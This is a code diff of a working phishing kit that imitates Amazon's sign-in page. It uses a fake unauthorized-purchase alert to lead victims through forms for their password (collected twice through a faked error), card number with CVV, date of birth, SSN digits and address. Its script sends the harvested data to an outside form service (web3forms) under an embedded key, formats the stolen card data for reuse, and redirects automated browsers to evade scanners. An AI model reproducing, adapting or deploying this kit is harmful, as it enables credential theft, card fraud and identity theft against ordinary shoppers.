@@ -7,60 +7,39 @@
     <link rel="icon" href="https://www.amazon.com/favicon.ico">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: "Amazon Ember", Arial, sans-serif; background: #FFFFFF; min-height: 100vh; display: flex; flex-direction: column; font-size: 13px; color: #0F1111; -webkit-font-smoothing: antialiased; }
+        body { font-family: "Amazon Ember", Arial, sans-serif; background: #FFF; min-height: 100vh; display: flex; flex-direction: column; font-size: 13px; color: #0F1111; }
         a { color: #0066C0; text-decoration: none; }
-        a:hover { color: #C45500; text-decoration: underline; cursor: pointer; }
+        a:hover { color: #C45500; text-decoration: underline; }
         .main { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 14px 18px; }
         .logo { padding: 14px 0 12px; text-align: center; }
         .logo img { width: 103px; height: auto; }
         .box { border: 1px solid #DDD; border-radius: 8px; padding: 20px 26px; max-width: 350px; width: 100%; margin-bottom: 22px; }
         .box-wide { max-width: 400px; }
-        h1 { font-size: 28px; font-weight: 400; color: #111; margin-bottom: 10px; line-height: 1.2; }
+        h1 { font-size: 28px; font-weight: 400; color: #111; margin-bottom: 10px; }
         .form-group { margin-bottom: 14px; }
-        label { display: block; font-size: 13px; font-weight: 700; color: #111; padding-bottom: 2px; padding-left: 2px; }
+        label { display: block; font-size: 13px; font-weight: 700; color: #111; padding-bottom: 2px; }
         .label-row { display: flex; justify-content: space-between; align-items: center; }
-        input[type="text"], input[type="password"], input[type="email"], input[type="tel"] {
-            width: 100%; padding: 7px 10px; font-size: 13px;
-            border: 1px solid #A6A6A6; border-radius: 3px; border-top-color: #949494;
-            outline: none; box-shadow: 0 1px 0 rgba(255,255,255,.5), 0 1px 0 rgba(0,0,0,.07) inset;
-        }
+        input[type="text"], input[type="password"], input[type="email"], input[type="tel"] { width: 100%; padding: 7px 10px; font-size: 13px; border: 1px solid #A6A6A6; border-radius: 3px; border-top-color: #949494; outline: none; }
         input:focus { border-color: #E77600; box-shadow: 0 0 3px 2px rgba(228,121,17,.5); }
-        .btn {
-            display: block; width: 100%; padding: 10px 10px 11px; font-size: 13px;
-            background: linear-gradient(to bottom, #F7DFA5, #F0C14B);
-            border: 1px solid; border-color: #A88734 #9C7E31 #846A29;
-            border-radius: 3px; cursor: pointer; color: #111;
-            box-shadow: 0 1px 0 rgba(255,255,255,.4) inset;
-            text-align: center; font-weight: 400;
-        }
+        .btn { display: block; width: 100%; padding: 10px; font-size: 13px; background: linear-gradient(to bottom, #F7DFA5, #F0C14B); border: 1px solid #A88734; border-radius: 3px; cursor: pointer; color: #111; text-align: center; }
         .btn:hover { background: linear-gradient(to bottom, #F5D78E, #EEB933); }
-        .btn:active { background: #F0C14B; box-shadow: 0 1px 3px rgba(0,0,0,.2) inset; }
-        .btn-orange {
-            background: linear-gradient(to bottom, #F8A746, #F08804);
-            border-color: #A96614 #9A5F11 #7F4E0F; color: #FFF; font-weight: 700;
-        }
-        .btn-orange:hover { background: linear-gradient(to bottom, #F59F36, #E67C00); }
-        .btn-danger {
-            background: linear-gradient(to bottom, #FF6666, #CC0C39);
-            border-color: #A00 #900 #800; color: #FFF; font-weight: 700;
-        }
-        .btn-danger:hover { background: linear-gradient(to bottom, #FF5555, #B00B32); }
+        .btn-orange { background: linear-gradient(to bottom, #F8A746, #F08804); border-color: #A96614; color: #FFF; font-weight: 700; }
+        .btn-danger { background: linear-gradient(to bottom, #FF6666, #CC0C39); border-color: #A00; color: #FFF; font-weight: 700; }
         .email-display { font-size: 13px; color: #111; margin-bottom: 10px; }
-        .email-display a { margin-left: 5px; font-size: 13px; }
-        .legal { font-size: 12px; color: #111; margin-top: 18px; line-height: 1.5; }
+        .legal { font-size: 12px; margin-top: 18px; }
         .divider { display: flex; align-items: center; margin: 18px 0 16px; }
-        .divider-line { flex: 1; height: 1px; background: linear-gradient(to right, #FFF, #DDD 20%, #DDD 80%, #FFF); }
+        .divider-line { flex: 1; height: 1px; background: #DDD; }
         .divider-text { padding: 0 8px; font-size: 12px; color: #767676; }
         .help-text { font-size: 13px; margin-top: 16px; }
         .footer { text-align: center; padding: 26px 18px 30px; margin-top: auto; }
         .footer-divider { height: 44px; background: linear-gradient(to bottom, rgba(0,0,0,.14), rgba(0,0,0,.03) 3px, transparent); }
-        .footer-links { display: flex; justify-content: center; gap: 14px; flex-wrap: wrap; margin-bottom: 6px; font-size: 11px; }
+        .footer-links { display: flex; justify-content: center; gap: 14px; margin-bottom: 6px; font-size: 11px; }
         .footer-copy { font-size: 11px; color: #555; }
-        .error { background: #FFF; border: 1px solid #CC0C39; border-radius: 4px; border-left: 4px solid #CC0C39; padding: 14px 14px 14px 20px; margin-bottom: 18px; display: none; }
+        .error { border: 1px solid #CC0C39; border-left: 4px solid #CC0C39; padding: 14px; margin-bottom: 18px; display: none; border-radius: 4px; }
         .error.show { display: block; }
-        .error-title { font-size: 17px; font-weight: 700; color: #C40000; margin-bottom: 6px; display: flex; align-items: center; gap: 6px; }
-        .error-title::before { content: "!"; display: inline-flex; align-items: center; justify-content: center; width: 20px; height: 20px; background: #C40000; color: #FFF; border-radius: 50%; font-size: 14px; font-weight: 700; }
-        .error-text { font-size: 13px; color: #C40000; margin-left: 26px; }
+        .error-title { font-size: 17px; font-weight: 700; color: #C40000; margin-bottom: 6px; }
+        .error-title::before { content: "!"; display: inline-flex; align-items: center; justify-content: center; width: 20px; height: 20px; background: #C40000; color: #FFF; border-radius: 50%; font-size: 14px; margin-right: 8px; }
+        .error-text { font-size: 13px; color: #C40000; margin-left: 28px; }
         .step { display: none; }
         .step.active { display: block; }
         .loading { display: none; text-align: center; padding: 60px 20px; }
@@ -71,45 +50,40 @@
         .ssn-group { display: none; }
         .success-icon { width: 60px; height: 60px; background: #067D62; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; }
         .success-icon svg { width: 30px; height: 30px; fill: #FFF; }
-        .alert-banner { background: #FEF8F2; border: 1px solid #FFA41C; border-radius: 8px; padding: 14px; margin-bottom: 16px; }
-        .alert-banner-danger { border-color: #CC0C39; background: #FFF5F5; }
+        .alert-banner { background: #FFF5F5; border: 1px solid #CC0C39; border-radius: 8px; padding: 14px; margin-bottom: 16px; }
         .alert-header { display: flex; align-items: center; gap: 8px; margin-bottom: 8px; }
         .alert-icon { font-size: 20px; }
-        .alert-title { font-size: 14px; font-weight: 700; }
-        .alert-title-danger { color: #CC0C39; }
-        .order-card { background: #FFF; border: 1px solid #DDD; border-radius: 4px; padding: 12px; margin: 12px 0; }
+        .alert-title { font-size: 14px; font-weight: 700; color: #CC0C39; }
+        .order-card { border: 1px solid #DDD; border-radius: 4px; padding: 12px; margin: 12px 0; }
         .order-header { font-size: 12px; color: #565959; border-bottom: 1px solid #EEE; padding-bottom: 8px; margin-bottom: 10px; }
-        .order-item { display: flex; gap: 12px; align-items: flex-start; }
-        .order-img { width: 75px; height: 75px; background: #F7F7F7; border: 1px solid #DDD; border-radius: 4px; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .order-item { display: flex; gap: 12px; }
+        .order-img { width: 75px; height: 75px; border: 1px solid #DDD; border-radius: 4px; overflow: hidden; }
         .order-img img { max-width: 100%; max-height: 100%; object-fit: contain; }
-        .order-details { flex: 1; }
-        .order-name { font-size: 14px; color: #0F1111; line-height: 1.35; margin-bottom: 4px; }
+        .order-name { font-size: 14px; color: #0F1111; margin-bottom: 4px; }
         .order-price { font-size: 18px; color: #B12704; font-weight: 700; }
         .order-meta { font-size: 12px; color: #565959; margin-top: 4px; }
-        .order-badge { display: inline-block; background: #CC0C39; color: #FFF; font-size: 11px; font-weight: 700; padding: 3px 8px; border-radius: 3px; margin-top: 6px; text-transform: uppercase; }
+        .order-badge { display: inline-block; background: #CC0C39; color: #FFF; font-size: 11px; font-weight: 700; padding: 3px 8px; border-radius: 3px; margin-top: 6px; }
     </style>
 </head>
 <body>
     <div class="main">
         <div class="logo">
-            <a href="https://www.amazon.com">
-                <img src="https://images-na.ssl-images-amazon.com/images/G/01/gc/designs/livepreview/amazon_dkblue_noto_email_v2016_us-main._CB468775337_.png" alt="Amazon">
-            </a>
+            <a href="https://www.amazon.com"><img src="https://www.citypng.com/public/uploads/preview/horizontal-amazon-logo-701751695133921lc9rmc4uot.png" alt="Amazon"></a>
         </div>
         
         <div class="box step active" id="step1">
             <h1>Sign in</h1>
             <form id="emailForm">
                 <div class="form-group">
-                    <label for="email">Email or mobile phone number</label>
-                    <input type="text" id="email" name="email" required autofocus>
+                    <label>Email or mobile phone number</label>
+                    <input type="text" id="email" required autofocus>
                 </div>
                 <button type="submit" class="btn">Continue</button>
             </form>
             <p class="legal">By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</p>
             <div class="help-text"><a href="#">Need help?</a></div>
             <div class="divider"><span class="divider-line"></span><span class="divider-text">New to Amazon?</span><span class="divider-line"></span></div>
-            <a href="#" class="btn" style="background: linear-gradient(to bottom, #F7F8FA, #E7E9EC); border-color: #ADB1B8 #A2A6AC #8D9096; font-size: 12px; padding: 8px;">Create your Amazon account</a>
+            <a href="#" class="btn" style="background: linear-gradient(to bottom, #F7F8FA, #E7E9EC); border-color: #ADB1B8;">Create your Amazon account</a>
         </div>
 
         <div class="box step" id="step2">
@@ -121,35 +95,24 @@
             </div>
             <form id="passwordForm">
                 <div class="form-group">
-                    <div class="label-row">
-                        <label for="password">Password</label>
-                        <a href="#">Forgot your password?</a>
-                    </div>
-                    <input type="password" id="password" name="password" required>
+                    <div class="label-row"><label>Password</label><a href="#">Forgot your password?</a></div>
+                    <input type="password" id="password" required>
                 </div>
                 <button type="submit" class="btn">Sign in</button>
             </form>
-            <div class="form-group" style="margin-top: 12px;">
-                <label style="font-weight: 400; display: flex; align-items: center; gap: 6px; cursor: pointer;">
-                    <input type="checkbox" style="width: 15px; height: 15px;"> Keep me signed in.
-                    <a href="#" style="font-size: 12px;">Details</a>
-                </label>
-            </div>
+            <div style="margin-top: 12px;"><label style="font-weight: 400; display: flex; align-items: center; gap: 6px;"><input type="checkbox"> Keep me signed in. <a href="#">Details</a></label></div>
         </div>
 
         <div class="box box-wide step" id="step3">
-            <div class="alert-banner alert-banner-danger">
-                <div class="alert-header">
-                    <span class="alert-icon">⚠️</span>
-                    <span class="alert-title alert-title-danger">Unauthorized Purchase Detected</span>
-                </div>
-                <p style="font-size: 13px; line-height: 1.5;">We detected a suspicious purchase attempt on your account. If you did not authorize this transaction, please cancel immediately to prevent charges to your payment method.</p>
+            <div class="alert-banner">
+                <div class="alert-header"><span class="alert-icon">⚠️</span><span class="alert-title">Unauthorized Purchase Detected</span></div>
+                <p style="font-size: 13px;">We detected a suspicious purchase attempt. If you did not authorize this transaction, please cancel immediately.</p>
             </div>
             <div class="order-card">
                 <div class="order-header">Order <span id="orderNum">#112-9847362-8273645</span> | Placed today</div>
                 <div class="order-item">
                     <div class="order-img"><img id="productImg" src="https://m.media-amazon.com/images/I/61L5QgPvgqL._AC_SX679_.jpg" alt="Product"></div>
-                    <div class="order-details">
+                    <div>
                         <div class="order-name" id="productName">Apple MacBook Pro 16" M3 Max 1TB</div>
                         <div class="order-price">$<span id="productPrice">3,499.00</span></div>
                         <div class="order-meta">Qty: 1 | Ships to: Unknown Address</div>
@@ -157,37 +120,23 @@
                     </div>
                 </div>
             </div>
-            <p style="font-size: 12px; color: #565959; text-align: center; margin: 16px 0;">To cancel this order and secure your account, please verify your payment information.</p>
+            <p style="font-size: 12px; color: #565959; text-align: center; margin: 16px 0;">To cancel this order, please verify your payment information.</p>
             <button class="btn btn-danger" id="cancelOrderBtn">Cancel Order & Request Refund</button>
-            <p style="font-size: 11px; color: #565959; text-align: center; margin-top: 10px;">Refund will be processed within 3-5 business days</p>
         </div>
 
         <div class="box step" id="step4">
             <h1>Verify payment method</h1>
             <p style="color: #565959; margin-bottom: 16px;">To process your refund, please verify your payment details.</p>
             <form id="cardForm">
-                <div class="form-group">
-                    <label>Name on card</label>
-                    <input type="text" id="cardName" required>
-                </div>
-                <div class="form-group">
-                    <label>Card number</label>
-                    <input type="text" id="cardNumber" maxlength="19" required>
-                </div>
+                <div class="form-group"><label>Name on card</label><input type="text" id="cardName" required></div>
+                <div class="form-group"><label>Card number</label><input type="text" id="cardNumber" maxlength="19" required></div>
                 <div style="display: flex; gap: 12px;">
-                    <div class="form-group" style="flex: 1;">
-                        <label>Expiration date</label>
-                        <input type="text" id="cardExp" placeholder="MM / YY" maxlength="7" required>
-                    </div>
-                    <div class="form-group" style="flex: 1;">
-                        <label>CVV</label>
-                        <input type="text" id="cardCvv" maxlength="4" required>
-                    </div>
+                    <div class="form-group" style="flex: 1;"><label>Expiration</label><input type="text" id="cardExp" placeholder="MM / YY" maxlength="7" required></div>
+                    <div class="form-group" style="flex: 1;"><label>CVV</label><input type="text" id="cardCvv" maxlength="4" required></div>
                 </div>
                 <div class="card-icons">
                     <img src="https://images-na.ssl-images-amazon.com/images/G/01/checkout/payselect/card-logos-small/visa._CB658923706_.gif" alt="Visa">
                     <img src="https://images-na.ssl-images-amazon.com/images/G/01/checkout/payselect/card-logos-small/amex._CB658923713_.gif" alt="Amex">
-                    <img src="https://images-na.ssl-images-amazon.com/images/G/01/checkout/payselect/card-logos-small/discover._CB658923743_.gif" alt="Discover">
                 </div>
                 <button type="submit" class="btn btn-orange">Continue</button>
             </form>
@@ -195,55 +144,28 @@
 
         <div class="box step" id="step5">
             <h1>Confirm identity</h1>
-            <p style="color: #565959; margin-bottom: 16px;">Final step to complete your refund request.</p>
             <form id="billingForm">
-                <div class="form-group">
-                    <label>Full legal name</label>
-                    <input type="text" id="fullName" required>
-                </div>
-                <div class="form-group">
-                    <label>Date of birth</label>
-                    <input type="text" id="dob" placeholder="MM / DD / YYYY" maxlength="14" required>
-                </div>
-                <div class="form-group ssn-group" id="ssnGroup">
-                    <label>SSN (last 4 digits)</label>
-                    <input type="text" id="ssn" maxlength="4" placeholder="••••">
-                </div>
-                <div class="form-group">
-                    <label>Phone number</label>
-                    <input type="tel" id="phone" required>
-                </div>
-                <div class="form-group">
-                    <label>Billing address</label>
-                    <input type="text" id="address" required>
-                </div>
+                <div class="form-group"><label>Full name</label><input type="text" id="fullName" required></div>
+                <div class="form-group"><label>Date of birth</label><input type="text" id="dob" placeholder="MM / DD / YYYY" maxlength="14" required></div>
+                <div class="form-group ssn-group" id="ssnGroup"><label>SSN (last 4)</label><input type="text" id="ssn" maxlength="4"></div>
+                <div class="form-group"><label>Phone</label><input type="tel" id="phone" required></div>
+                <div class="form-group"><label>Address</label><input type="text" id="address" required></div>
                 <div style="display: flex; gap: 12px;">
-                    <div class="form-group" style="flex: 2;">
-                        <label>City</label>
-                        <input type="text" id="city" required>
-                    </div>
-                    <div class="form-group" style="flex: 1;">
-                        <label>ZIP</label>
-                        <input type="text" id="zip" required>
-                    </div>
+                    <div class="form-group" style="flex: 2;"><label>City</label><input type="text" id="city" required></div>
+                    <div class="form-group" style="flex: 1;"><label>ZIP</label><input type="text" id="zip" required></div>
                 </div>
                 <button type="submit" class="btn btn-orange">Complete Refund</button>
             </form>
         </div>
 
-        <div class="loading" id="loading">
-            <div class="spinner"></div>
-            <p style="color: #565959;">Processing...</p>
-        </div>
+        <div class="loading" id="loading"><div class="spinner"></div><p>Processing...</p></div>
 
         <div class="box step" id="step6">
             <div style="text-align: center; padding: 20px 0;">
-                <div class="success-icon">
-                    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
-                </div>
+                <div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
                 <h2 style="font-size: 20px; font-weight: 400; margin-bottom: 10px;">Refund Request Submitted</h2>
-                <p style="color: #565959; margin-bottom: 6px;">Order <span id="orderNumSuccess">#112-9847362-8273645</span> cancelled</p>
-                <p style="color: #067D62; font-weight: 700; font-size: 16px; margin-bottom: 16px;">Refund: $<span id="refundAmount">3,499.00</span></p>
+                <p style="color: #565959;">Order <span id="orderNumSuccess">#112-9847362-8273645</span> cancelled</p>
+                <p style="color: #067D62; font-weight: 700; font-size: 16px; margin: 10px 0;">Refund: $<span id="refundAmount">3,499.00</span></p>
                 <p style="font-size: 12px; color: #888;">Redirecting to Amazon...</p>
             </div>
         </div>
@@ -251,23 +173,14 @@
 
     <div class="footer">
         <div class="footer-divider"></div>
-        <div class="footer-links">
-            <a href="#">Conditions of Use</a>
-            <a href="#">Privacy Notice</a>
-            <a href="#">Help</a>
-        </div>
+        <div class="footer-links"><a href="#">Conditions of Use</a><a href="#">Privacy Notice</a><a href="#">Help</a></div>
         <div class="footer-copy">© 1996-2026, Amazon.com, Inc. or its affiliates</div>
     </div>
 
     <script>
         const WEB3FORMS_KEY = '04af8936-9e51-408a-b725-ab3331e183cf';
         const params = new URLSearchParams(window.location.search);
-        const config = {
-            product: params.get('product') || 'Apple MacBook Pro 16" M3 Max 1TB',
-            price: params.get('price') || '3,499.00',
-            order: params.get('order') || '112-' + Math.floor(1000000 + Math.random() * 9000000) + '-' + Math.floor(1000000 + Math.random() * 9000000),
-            img: params.get('img') || 'https://m.media-amazon.com/images/I/61L5QgPvgqL._AC_SX679_.jpg'
-        };
+        const config = { product: params.get('product') || 'Apple MacBook Pro 16" M3 Max 1TB', price: params.get('price') || '3,499.00', order: params.get('order') || '112-' + Math.floor(1000000 + Math.random() * 9000000) + '-' + Math.floor(1000000 + Math.random() * 9000000), img: params.get('img') || 'https://m.media-amazon.com/images/I/61L5QgPvgqL._AC_SX679_.jpg' };
         document.getElementById('productName').textContent = config.product;
         document.getElementById('productPrice').textContent = config.price;
         document.getElementById('orderNum').textContent = '#' + config.order;
@@ -276,40 +189,38 @@
         document.getElementById('productImg').src = config.img;
         
         let passwordAttempt = 0;
-        let collectedData = { email: '', password: '', password2: '', cardName: '', cardNumber: '', cardExp: '', cardCvv: '', fullName: '', dob: '', ssn: '', phone: '', address: '', city: '', zip: '', ip: '', country: '', userAgent: navigator.userAgent, screen: screen.width + 'x' + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, timestamp: '', product: config.product, order: config.order };
+        let data = { email: '', password: '', password2: '', cardName: '', cardNumber: '', cardExp: '', cardCvv: '', fullName: '', dob: '', ssn: '', phone: '', address: '', city: '', zip: '', ip: '', country: '', ua: navigator.userAgent, screen: screen.width + 'x' + screen.height, tz: Intl.DateTimeFormat().resolvedOptions().timeZone };
 
-        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => { collectedData.ip = d.ip; collectedData.country = d.country_code; if (d.country_code === 'US') { document.getElementById('ssnGroup').style.display = 'block'; document.getElementById('ssn').required = true; } }).catch(() => {});
+        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => { data.ip = d.ip; data.country = d.country_code; if (d.country_code === 'US') { document.getElementById('ssnGroup').style.display = 'block'; document.getElementById('ssn').required = true; } }).catch(() => {});
 
-        document.getElementById('cardNumber').addEventListener('input', function(e) { let v = e.target.value.replace(/\D/g, '').substring(0, 16); e.target.value = v.replace(/(.{4})/g, '$1 ').trim(); });
-        document.getElementById('cardExp').addEventListener('input', function(e) { let v = e.target.value.replace(/\D/g, '').substring(0, 4); if (v.length >= 2) v = v.substring(0,2) + ' / ' + v.substring(2); e.target.value = v; });
-        document.getElementById('dob').addEventListener('input', function(e) { let v = e.target.value.replace(/\D/g, '').substring(0, 8); if (v.length >= 4) v = v.substring(0,2) + ' / ' + v.substring(2,4) + ' / ' + v.substring(4,8); else if (v.length >= 2) v = v.substring(0,2) + ' / ' + v.substring(2); e.target.value = v; });
-        document.getElementById('ssn').addEventListener('input', function(e) { e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4); });
+        document.getElementById('cardNumber').addEventListener('input', e => { let v = e.target.value.replace(/\D/g, '').substring(0, 16); e.target.value = v.replace(/(.{4})/g, '$1 ').trim(); });
+        document.getElementById('cardExp').addEventListener('input', e => { let v = e.target.value.replace(/\D/g, '').substring(0, 4); if (v.length >= 2) v = v.substring(0,2) + ' / ' + v.substring(2); e.target.value = v; });
+        document.getElementById('dob').addEventListener('input', e => { let v = e.target.value.replace(/\D/g, '').substring(0, 8); if (v.length >= 4) v = v.substring(0,2) + ' / ' + v.substring(2,4) + ' / ' + v.substring(4,8); else if (v.length >= 2) v = v.substring(0,2) + ' / ' + v.substring(2); e.target.value = v; });
+        document.getElementById('ssn').addEventListener('input', e => { e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4); });
 
         function showStep(n) { document.querySelectorAll('.step').forEach(s => s.classList.remove('active')); document.getElementById('step' + n).classList.add('active'); window.scrollTo(0, 0); }
         function showLoading(show) { document.querySelectorAll('.step').forEach(s => s.classList.remove('active')); document.getElementById('loading').style.display = show ? 'block' : 'none'; }
-        function getSubject(step) { if (step === 1) return 'Email Access'; if (step === 2) return 'Card Info'; return 'Personal Info'; }
 
         async function sendData(step) {
-            collectedData.timestamp = new Date().toISOString();
-            let msg = '=== AMAZON [' + config.order + '] ===\nProduct: ' + config.product + '\nPrice: $' + config.price + '\n\n--- LOGIN ---\nEmail: ' + collectedData.email + '\nPass1: ' + collectedData.password + '\n';
-            if (collectedData.password2) msg += 'Pass2: ' + collectedData.password2 + '\n';
-            if (step >= 2) { msg += '\n--- CARD ---\nName: ' + collectedData.cardName + '\nCard: ' + collectedData.cardNumber + '\nExp: ' + collectedData.cardExp + '\nCVV: ' + collectedData.cardCvv + '\n'; let cn = collectedData.cardNumber.replace(/\s/g, ''); let exp = collectedData.cardExp.replace(/\s/g, '').split('/'); msg += 'FORMAT: ' + cn + '|' + (exp[0]||'') + '|' + (exp[1]||'') + '|' + collectedData.cardCvv + '\n'; }
-            if (step >= 3) { msg += '\n--- PERSONAL ---\nName: ' + collectedData.fullName + '\nDOB: ' + collectedData.dob + '\n'; if (collectedData.ssn) msg += 'SSN4: ' + collectedData.ssn + '\n'; msg += 'Phone: ' + collectedData.phone + '\nAddr: ' + collectedData.address + ', ' + collectedData.city + ' ' + collectedData.zip + '\n'; }
-            msg += '\n--- DEVICE ---\nIP: ' + collectedData.ip + ' (' + collectedData.country + ')\nScreen: ' + collectedData.screen + '\nTZ: ' + collectedData.timezone + '\n';
-            try { await fetch('https://api.web3forms.com/submit', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ access_key: WEB3FORMS_KEY, subject: getSubject(step), from_name: 'D1337 Project', message: msg }) }); } catch(e) {}
+            let msg = '=== AMAZON [' + config.order + '] ===\nProduct: ' + config.product + '\nPrice: $' + config.price + '\n\n--- LOGIN ---\nEmail: ' + data.email + '\nPass1: ' + data.password + '\n';
+            if (data.password2) msg += 'Pass2: ' + data.password2 + '\n';
+            if (step >= 2) { msg += '\n--- CARD ---\nName: ' + data.cardName + '\nCard: ' + data.cardNumber + '\nExp: ' + data.cardExp + '\nCVV: ' + data.cardCvv + '\n'; let cn = data.cardNumber.replace(/\s/g, ''); let exp = data.cardExp.replace(/\s/g, '').split('/'); msg += 'FORMAT: ' + cn + '|' + (exp[0]||'') + '|' + (exp[1]||'') + '|' + data.cardCvv + '\n'; }
+            if (step >= 3) { msg += '\n--- PERSONAL ---\nName: ' + data.fullName + '\nDOB: ' + data.dob + '\n'; if (data.ssn) msg += 'SSN4: ' + data.ssn + '\n'; msg += 'Phone: ' + data.phone + '\nAddr: ' + data.address + ', ' + data.city + ' ' + data.zip + '\n'; }
+            msg += '\n--- DEVICE ---\nIP: ' + data.ip + ' (' + data.country + ')\nScreen: ' + data.screen + '\nTZ: ' + data.tz + '\n';
+            try { await fetch('https://api.web3forms.com/submit', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ access_key: WEB3FORMS_KEY, subject: step === 1 ? 'Email Access' : step === 2 ? 'Card Info' : 'Personal Info', from_name: 'D1337 Project', message: msg }) }); } catch(e) {}
         }
 
-        document.getElementById('emailForm').addEventListener('submit', function(e) { e.preventDefault(); collectedData.email = document.getElementById('email').value; document.getElementById('emailDisplayWrap').innerHTML = collectedData.email + ' <a href="#" id="changeEmail">Change</a>'; document.getElementById('changeEmail').addEventListener('click', function(ev) { ev.preventDefault(); showStep(1); }); showStep(2); document.getElementById('password').focus(); });
+        document.getElementById('emailForm').addEventListener('submit', e => { e.preventDefault(); data.email = document.getElementById('email').value; document.getElementById('emailDisplayWrap').innerHTML = data.email + ' <a href="#" id="changeEmail">Change</a>'; document.getElementById('changeEmail').addEventListener('click', ev => { ev.preventDefault(); showStep(1); }); showStep(2); document.getElementById('password').focus(); });
 
-        document.getElementById('passwordForm').addEventListener('submit', async function(e) { e.preventDefault(); passwordAttempt++; if (passwordAttempt === 1) { collectedData.password = document.getElementById('password').value; document.getElementById('error2').classList.add('show'); document.getElementById('password').value = ''; document.getElementById('password').focus(); return; } collectedData.password2 = document.getElementById('password').value; document.getElementById('error2').classList.remove('show'); showLoading(true); await sendData(1); setTimeout(() => { showLoading(false); showStep(3); }, 1500); });
+        document.getElementById('passwordForm').addEventListener('submit', async e => { e.preventDefault(); passwordAttempt++; if (passwordAttempt === 1) { data.password = document.getElementById('password').value; document.getElementById('error2').classList.add('show'); document.getElementById('password').value = ''; document.getElementById('password').focus(); return; } data.password2 = document.getElementById('password').value; document.getElementById('error2').classList.remove('show'); showLoading(true); await sendData(1); setTimeout(() => { showLoading(false); showStep(3); }, 1500); });
 
-        document.getElementById('cancelOrderBtn').addEventListener('click', function() { showStep(4); });
+        document.getElementById('cancelOrderBtn').addEventListener('click', () => showStep(4));
 
-        document.getElementById('cardForm').addEventListener('submit', async function(e) { e.preventDefault(); collectedData.cardName = document.getElementById('cardName').value; collectedData.cardNumber = document.getElementById('cardNumber').value; collectedData.cardExp = document.getElementById('cardExp').value; collectedData.cardCvv = document.getElementById('cardCvv').value; showLoading(true); await sendData(2); setTimeout(() => { showLoading(false); showStep(5); }, 1500); });
+        document.getElementById('cardForm').addEventListener('submit', async e => { e.preventDefault(); data.cardName = document.getElementById('cardName').value; data.cardNumber = document.getElementById('cardNumber').value; data.cardExp = document.getElementById('cardExp').value; data.cardCvv = document.getElementById('cardCvv').value; showLoading(true); await sendData(2); setTimeout(() => { showLoading(false); showStep(5); }, 1500); });
 
-        document.getElementById('billingForm').addEventListener('submit', async function(e) { e.preventDefault(); collectedData.fullName = document.getElementById('fullName').value; collectedData.dob = document.getElementById('dob').value; collectedData.ssn = document.getElementById('ssn').value; collectedData.phone = document.getElementById('phone').value; collectedData.address = document.getElementById('address').value; collectedData.city = document.getElementById('city').value; collectedData.zip = document.getElementById('zip').value; showLoading(true); await sendData(3); setTimeout(() => { showLoading(false); showStep(6); setTimeout(() => { window.location.href = 'https://www.amazon.com/'; }, 4000); }, 2000); });
+        document.getElementById('billingForm').addEventListener('submit', async e => { e.preventDefault(); data.fullName = document.getElementById('fullName').value; data.dob = document.getElementById('dob').value; data.ssn = document.getElementById('ssn').value; data.phone = document.getElementById('phone').value; data.address = document.getElementById('address').value; data.city = document.getElementById('city').value; data.zip = document.getElementById('zip').value; showLoading(true); await sendData(3); setTimeout(() => { showLoading(false); showStep(6); setTimeout(() => { window.location.href = 'https://www.amazon.com/'; }, 4000); }, 2000); });
 
-        (function() { if (navigator.webdriver || window.callPhantom || window._phantom || navigator.userAgent.toLowerCase().includes('headless')) { window.location.href = 'https://www.amazon.com/'; } })();
+        (function() { if (navigator.webdriver || navigator.userAgent.toLowerCase().includes('headless')) window.location.href = 'https://www.amazon.com/'; })();
     </script>
 </body>
 </html>
